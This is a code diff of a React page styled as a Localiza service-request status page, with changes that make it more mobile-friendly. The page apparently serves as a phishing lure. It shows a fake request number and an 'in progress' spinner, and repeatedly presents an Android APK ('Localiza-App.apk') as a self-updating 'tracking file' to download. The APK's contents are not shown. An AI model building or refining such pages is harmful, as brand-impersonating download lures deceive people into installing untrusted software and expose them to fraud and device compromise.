@@ -24,46 +24,52 @@ export default function Home() {
   return (
     <div className="min-h-screen flex flex-col">
       {/* Header com Logo */}
-      <header className="bg-[#01602a] shadow-sm py-4 px-6">
-        <div className="max-w-6xl mx-auto flex items-center">
-          <img src="/localiza-logo.svg" alt="Localiza" className="h-8" />
+      <header className="bg-[#01602a] shadow-sm py-3 sm:py-4 px-4 sm:px-6">
+        <div className="max-w-6xl mx-auto flex items-center justify-center sm:justify-start">
+          <img 
+            src="/localiza-logo.svg" 
+            alt="Localiza" 
+            className="h-6 sm:h-8 md:h-10" 
+          />
         </div>
       </header>
 
       {/* Conteúdo Principal */}
-      <main className="flex-1 flex items-center justify-center px-4 py-12">
-        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 max-w-4xl w-full p-8 md:p-12">
+      <main className="flex-1 flex items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
+        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg border border-gray-200 max-w-4xl w-full p-4 sm:p-6 md:p-8 lg:p-12">
           {/* Título e Status */}
-          <div className="bg-[#01602a] text-white px-6 py-4 -mx-8 -mt-8 md:-mx-12 md:-mt-12 rounded-t-2xl mb-8 flex items-center justify-between">
-            <h1 className="text-2xl md:text-3xl font-bold">
-              Solicitação N° 61515712
-            </h1>
-            <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
-              <svg
-                className="w-4 h-4 animate-spin"
-                fill="none"
-                viewBox="0 0 24 24"
-              >
-                <circle
-                  className="opacity-25"
-                  cx="12"
-                  cy="12"
-                  r="10"
-                  stroke="currentColor"
-                  strokeWidth="4"
-                ></circle>
-                <path
-                  className="opacity-75"
-                  fill="currentColor"
-                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                ></path>
-              </svg>
-              <span className="text-sm font-semibold">Em andamento</span>
+          <div className="bg-[#01602a] text-white px-4 sm:px-6 py-4 sm:py-5 -mx-4 -mt-4 sm:-mx-6 sm:-mt-6 md:-mx-8 md:-mt-8 lg:-mx-12 lg:-mt-12 rounded-t-xl sm:rounded-t-2xl mb-6 sm:mb-8">
+            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
+              <h1 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold leading-tight">
+                Solicitação N° 61515712
+              </h1>
+              <div className="flex items-center gap-2 bg-white/20 px-3 sm:px-4 py-2 rounded-full self-start sm:self-auto">
+                <svg
+                  className="w-3 h-3 sm:w-4 sm:h-4 animate-spin flex-shrink-0"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                >
+                  <circle
+                    className="opacity-25"
+                    cx="12"
+                    cy="12"
+                    r="10"
+                    stroke="currentColor"
+                    strokeWidth="4"
+                  ></circle>
+                  <path
+                    className="opacity-75"
+                    fill="currentColor"
+                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                  ></path>
+                </svg>
+                <span className="text-xs sm:text-sm font-semibold whitespace-nowrap">Em andamento</span>
+              </div>
             </div>
           </div>
 
           {/* Carrossel de Banners */}
-          <div className="mb-8 relative rounded-xl overflow-hidden group">
+          <div className="mb-6 sm:mb-8 relative rounded-lg sm:rounded-xl overflow-hidden group">
             <img
               src={banners[currentBanner]}
               alt={`Banner Localiza ${currentBanner + 1}`}
@@ -73,11 +79,11 @@ export default function Home() {
             {/* Botões de navegação */}
             <button
               onClick={prevBanner}
-              className="absolute left-4 top-1/2 -translate-y-1/2 bg-black/50 hover:bg-black/70 text-white p-3 rounded-full transition-all opacity-0 group-hover:opacity-100"
+              className="absolute left-2 sm:left-4 top-1/2 -translate-y-1/2 bg-black/50 hover:bg-black/70 text-white p-2 sm:p-3 rounded-full transition-all opacity-100 sm:opacity-0 sm:group-hover:opacity-100 touch-manipulation"
               aria-label="Banner anterior"
             >
               <svg
-                className="w-6 h-6"
+                className="w-4 h-4 sm:w-5 sm:h-5 md:w-6 md:h-6"
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -93,11 +99,11 @@ export default function Home() {
 
             <button
               onClick={nextBanner}
-              className="absolute right-4 top-1/2 -translate-y-1/2 bg-black/50 hover:bg-black/70 text-white p-3 rounded-full transition-all opacity-0 group-hover:opacity-100"
+              className="absolute right-2 sm:right-4 top-1/2 -translate-y-1/2 bg-black/50 hover:bg-black/70 text-white p-2 sm:p-3 rounded-full transition-all opacity-100 sm:opacity-0 sm:group-hover:opacity-100 touch-manipulation"
               aria-label="Próximo banner"
             >
               <svg
-                className="w-6 h-6"
+                className="w-4 h-4 sm:w-5 sm:h-5 md:w-6 md:h-6"
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -112,15 +118,15 @@ export default function Home() {
             </button>
 
             {/* Indicadores */}
-            <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex gap-2">
+            <div className="absolute bottom-3 sm:bottom-4 left-1/2 -translate-x-1/2 flex gap-1.5 sm:gap-2">
               {banners.map((_, index) => (
                 <button
                   key={index}
                   onClick={() => setCurrentBanner(index)}
-                  className={`w-2 h-2 rounded-full transition-all ${
+                  className={`h-2 sm:h-2.5 rounded-full transition-all touch-manipulation ${
                     index === currentBanner
-                      ? "bg-white w-8"
-                      : "bg-white/50 hover:bg-white/75"
+                      ? "bg-white w-6 sm:w-8"
+                      : "bg-white/50 hover:bg-white/75 w-2 sm:w-2.5"
                   }`}
                   aria-label={`Ir para banner ${index + 1}`}
                 />
@@ -129,11 +135,11 @@ export default function Home() {
           </div>
 
           {/* Seção de Acompanhamento */}
-          <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-xl p-6 mb-6">
-            <h4 className="text-xl font-bold text-gray-800 mb-4 text-center">
+          <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-lg sm:rounded-xl p-4 sm:p-6 mb-4 sm:mb-6">
+            <h4 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-800 mb-3 sm:mb-4 text-center">
               Acompanhe em Tempo Real
             </h4>
-            <p className="text-gray-700 text-center mb-6">
+            <p className="text-sm sm:text-base text-gray-700 text-center mb-4 sm:mb-6 leading-relaxed px-2">
               Baixe o arquivo de acompanhamento para receber atualizações em
               tempo real sobre o andamento da sua solicitação.
             </p>
@@ -143,10 +149,10 @@ export default function Home() {
               <a
                 href="/app.apk"
                 download="Localiza-App.apk"
-                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center gap-3 text-lg"
+                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3 sm:py-4 px-6 sm:px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center gap-2 sm:gap-3 text-sm sm:text-base md:text-lg touch-manipulation w-full sm:w-auto justify-center"
               >
                 <svg
-                  className="w-6 h-6"
+                  className="w-5 h-5 sm:w-6 sm:h-6 flex-shrink-0"
                   fill="none"
                   stroke="currentColor"
                   viewBox="0 0 24 24"
@@ -158,20 +164,20 @@ export default function Home() {
                     d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"
                   />
                 </svg>
-                Baixar Arquivo de Acompanhamento
+                <span className="leading-tight">Baixar Arquivo de Acompanhamento</span>
               </a>
             </div>
 
-            <p className="text-sm text-gray-600 text-center mt-4 italic">
+            <p className="text-xs sm:text-sm text-gray-600 text-center mt-3 sm:mt-4 italic px-2">
               O arquivo será atualizado automaticamente com novas informações
             </p>
           </div>
 
           {/* Informações Importantes */}
-          <div className="bg-blue-50 border-l-4 border-blue-500 rounded-lg p-6 mb-6">
-            <h5 className="font-bold text-gray-800 mb-3 flex items-center gap-2">
+          <div className="bg-blue-50 border-l-4 border-blue-500 rounded-lg p-4 sm:p-6">
+            <h5 className="font-bold text-gray-800 mb-3 flex items-start sm:items-center gap-2 text-sm sm:text-base">
               <svg
-                className="w-5 h-5 text-blue-500"
+                className="w-4 h-4 sm:w-5 sm:h-5 text-blue-500 flex-shrink-0 mt-0.5 sm:mt-0"
                 fill="currentColor"
                 viewBox="0 0 20 20"
               >
@@ -181,20 +187,20 @@ export default function Home() {
                   clipRule="evenodd"
                 />
               </svg>
-              Importante
+              <span>Importante</span>
             </h5>
-            <p className="text-gray-700 text-sm mb-4">
+            <p className="text-gray-700 text-xs sm:text-sm mb-4 leading-relaxed">
               Para acompanhar as atualizações desta solicitação, baixe o arquivo
               acima. Ele contém um link seguro que será atualizado
               automaticamente com o status e respostas.
             </p>
-            <h5 className="font-bold text-gray-800 mb-3">
+            <h5 className="font-bold text-gray-800 mb-3 text-sm sm:text-base">
               Acompanhe em tempo real
             </h5>
             <a
               href="/app.apk"
               download="Localiza-App.apk"
-              className="inline-block bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200"
+              className="inline-block bg-green-500 hover:bg-green-600 text-white font-semibold py-2.5 sm:py-3 px-5 sm:px-6 rounded-lg transition-colors duration-200 text-sm sm:text-base touch-manipulation"
             >
               Baixar Arquivo
             </a>
@@ -203,9 +209,9 @@ export default function Home() {
       </main>
 
       {/* Footer */}
-      <footer className="bg-gray-800 text-white py-6 px-4">
+      <footer className="bg-gray-800 text-white py-4 sm:py-6 px-4">
         <div className="max-w-6xl mx-auto text-center">
-          <p className="text-sm">
+          <p className="text-xs sm:text-sm">
             Localiza © 2026 Todos os direitos reservados
           </p>
         </div>
